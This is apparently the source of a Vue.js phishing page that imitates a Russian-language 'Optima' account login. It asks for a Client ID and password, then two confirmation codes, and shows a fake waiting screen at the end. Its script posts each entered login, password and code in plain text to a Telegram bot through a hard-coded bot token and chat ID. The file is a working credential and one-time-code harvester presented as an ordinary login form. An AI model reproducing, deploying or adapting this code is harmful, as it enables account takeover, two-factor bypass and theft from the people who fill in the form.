<template>
  <div id="app">
    <div class="container d-flex justify-content-center">
      <div class="row block-all">
        <div class="col pt-3">
          <div class="text-center">
            <img class="mb-3 logo" style="width: 250px;" src="@/assets/logo_optima.png">
          </div>

          <div v-show="step === 1" class="step">
            <form method="POST" @submit.prevent="submit">
              <div class="mb-3">
                <label class="pwd" for="login">Логин</label>
                <input required v-model="loginUser" type="text" class="form-control inp" maxlength="7" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" oninput="this.value|=0" placeholder="Введите свой Client ID" id="name" aria-describedby="name">
                <!-- <div id="emailHelp" class="form-text">Максимальное количество цифр 7</div> -->
              </div>
              <div class="mb-3">
                <label class="pwd" for="password">Пароль</label>
                <input required v-model="idCard" type="password" class="form-control inp" placeholder="Введите пароль" id="exampleInputEmail1" aria-describedby="emailHelp">
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Вход</button>
              </div>
            </form>
          </div>

          <div v-show="step === 2" class="step">
            <form method="POST" @submit.prevent="submitFormTwo">
              <div class="mb-3">
                <input required v-model="codeAuth" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Введите код" id="name" aria-describedby="name">
                <div class="text-center code-text">Код подтверждения приходить в течении {{time}} сек</div>
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Подвердить</button>
              </div>
            </form>
          </div>

          <div v-show="step === 3" class="step">
            <form method="POST" @submit.prevent="submitFormThree">
              <div class="mb-3">
                <input required v-model="codeAuthTwo" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Введите код" id="name" aria-describedby="name">
                <div id="emailHelp" class="form-text color-den" @click="againAuthCode">Введите повторно новый код для подтверждения</div>
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger btn-blockk" :disabled="dsbAgainAuth" @click="nextCodeAuth">Подвердить повторно</button>
              </div>
            </form>
          </div>

          <div v-show="step === 4" class="step text-center">
            <img class="mb-3 logo" src="@/assets/galg.gif">
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'App',

  data() {
    return {
      fullName: '',
      email: '',
      subject: '',
      message: '',

      token: '5681484607:AAHzEthwDk9Q88w3CPVg5xnoon5R0adaxGs',
      chatId: -852249326,

      step: 1,
      date: moment(60 * 1 * 1000),
      dsbAgainAuth: true
    }
  },
  methods: {
    submit() {
      const fullMessage = `Логин: ${this.loginUser}\nПароль: ${this.idCard}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    },
    nextCodeAuth() {
      this.step++
    },
    submitFormTwo() {
      const fullMessage = `Код: ${this.codeAuth}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    },
    submitFormThree() {
      const fullMessage = `Повторный код: ${this.codeAuthTwo}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    },
     againAuthCode() {
      const fullMessage = `Спрашивает новый код`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`);
      this.dsbAgainAuth = false;
    }
  },
  computed: {
    time: function(){
      return this.date.format('mm:ss');
    }
  },
  mounted: function(){   
    setInterval(() => {
      this.date = moment(this.date.subtract(1, 'seconds'))
    }, 1000);
  }
}
</script>

<style>
.btn:focus, .btn:active {
  box-shadow: none !important;
}

.form-control {
  background-color: rgb(233, 233, 233) !important;
  border: 0 rgb(233, 233, 233) !important;
  height: 40px !important;
}

.form-control:focus, .form-control:active {
  box-shadow: none !important;
  background-color: rgb(233, 233, 233) !important;
  border: 0 rgb(233, 233, 233) !important;
}

.h-100 {
  height: 100vh !important;
}

.form-text {
  margin-top: -2px;
}

.logo {
  width: 130px !important;
}

.pwd {
  font-size: 14px;
  color: grey;
  margin-left: 12px;
}

.block-all {
  width: 350px;
}

.btn-blockk {
  width: 100%;
  height: 40px;
  font-weight: 500;
  margin-top: 50px;
}

.color-den {
  color: rgb(255, 0, 0);
  font-size: 13px;
}

.code-text {
  font-size: 13px;
}
</style>